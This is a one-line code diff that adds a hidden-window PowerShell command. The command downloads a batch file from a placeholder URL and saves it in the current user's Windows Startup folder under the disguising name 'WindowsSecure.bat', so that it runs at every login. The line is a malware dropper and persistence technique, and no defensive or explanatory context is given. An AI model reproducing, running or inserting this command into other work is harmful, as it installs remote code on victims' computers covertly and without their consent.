@@ -1,0 +1,1 @@
+powershell -windowstyle hidden Invoke-WebRequest -URI https://<đường dẫn bat>/startup.bat -OutFile "C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat";
